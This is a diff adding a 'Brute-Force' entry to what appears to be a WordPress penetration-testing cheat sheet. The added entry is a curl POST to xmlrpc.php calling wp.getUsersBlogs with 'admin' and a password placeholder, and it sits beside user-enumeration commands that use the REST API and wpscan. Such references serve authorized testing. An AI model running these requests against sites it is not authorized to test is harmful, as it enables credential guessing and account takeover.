@@ -1695,6 +1695,12 @@ $ curl http://<URL>/wp-json/wp/v2/users | jq
 $ wpscan --url <URL> -e u	
 ```
 
+- Brute-Force
+
+```
+$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://<URL>/xmlrpc.php
+```
+
 #25. - Sensitive Data Exposure
 -----------------------------------------
 
